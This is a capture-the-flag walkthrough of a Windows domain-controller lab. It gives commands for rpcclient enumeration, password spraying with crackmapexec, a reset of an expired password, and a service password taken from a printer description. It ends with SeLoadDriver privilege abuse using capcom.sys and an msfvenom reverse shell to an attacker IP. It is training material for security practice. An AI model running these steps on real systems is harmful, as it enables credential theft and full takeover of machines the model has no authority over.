
**Skills Required**
Basic Windows Knowledge
**Skills Learned**
Printer Enumeration
Reset Expired Passwords
SeLoadDriver Privilege Abuse
Password Spraying

---------------
rpcclient, Enumerate Printer Service, cewl, crackmapexec, smb, smbpasswd, Connect with rpcclient, enumdomusers, enumprinters, Reuse crackmapexec, winrm, Privilege Escalation, Load and unload device drivers, EoPLoadDriver, capcom.sys, exploitcapcom, Generic-AppLockerbypasses, reverse.exe, msfvenom, LoadDriver.exe, ExploitCapcom.exe, reverse shell, administrator, Finding the flag.

-------------------
Title: **Enumerating Open Ports 135/139 (Domain Controller) with rpcclient**

**Step 1: Enumerate Users**

```bash
rpcclient -U "" ip -N
```

**If you can't enumerate users, proceed to Step 2.**

**Step 2: Port 80 Check**

Check if port 80 is open. If it is, find the domain name and add it to /etc/hosts.

**Step 3: Enumerate Printer Service**

Enumerate printer services to find potential user accounts:

Usernames: pmerton, tlavel, sthompson, bhult, administrator

**Step 4: Build a Password Dictionary**

Create a password dictionary based on website content:

```bash
cewl -w passwords ipvictim --with-numbers
```

**If users are found, proceed to Step 5.**

**Step 5: Use crackmapexec**

If valid credentials are available, use crackmapexec for SMB enumeration:

```bash
crackmapexec smb ip -u users -p passwords --continue-on-success
```

**If a valid credential with status_password_must_change is found, use smbpasswd.**

```bash
smbpasswd -r ip -U "username"
```

**If the password is changed, proceed to Step 6.**

**Step 6: Connect with rpcclient**

With valid credentials, connect using rpcclient:

```bash
rpcclient -U 'username%password' ip
```

Copy the found users and save them:

```bash
rpcclient enumdomusers
```

**If there are printers (search for important data in the description):**

```bash
rpcclient enumprinters   -  $fab@s3Rv1ce$1
```

**Step 7: Reuse crackmapexec**

Since a password was found in the printers, use crackmapexec again:

```bash
crackmapexec smb ip -u users -p 'password'
svc-print:$fab@s3Rv1ce$1 
```

**Step 8: Try crackmapexec and winrm to check if the user and passwd are available to gain access to the system**

If valid credentials are found with crackmapexec, try connecting with crackmapexec and winrm:

```bash
crackmapexec winrm ip -u "username" -p 'password'

╰─❯ evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'                                                        
```

**Step 9: Privilege Escalation**

Navigate to the temp directory and enumerate user privileges:

```bash
whoami /priv
```

**If the "Load and unload device drivers" privilege is found (dangerous):**

Search for "Load and unload device drivers" on tarlogic.com. Compile a Windows Console App in C++ named EoPLoadDriver (64-bit). Download capcom.sys.

Find exploitcapcom on GitHub (exploitcapcom.sln) and compile it with this path at the end: `("C:\\Windows\\System32\\spool\\drivers\\color\\reverse.exe")`

Search for Generic-AppLockerbypasses.md and select a path: (spool, driver, colors) `C:\Windows\System32\spool\drivers\color`

Create reverse.exe with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.100 LPORT=1234 -f exe -o reverse.exe
```

Send everything to the victim machine:

windows/Temp > upload Capcom.sys, LoadDriver.exe, ExploitCapcom.exe
cd `C:\Windows\System32\spool\drivers\color\`
upload reverse.exe

Run on the victim machine:

```bash
C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\kvzlxshell C:\Windows\Temp\Capcom.sys
C:\Windows\Temp\ExploitCapcom.exe
```

This will give you a reverse shell as an administrator, solving the machine.

**Finding the flag**

---

5fe5f7a225cce602d234330a64b66905


















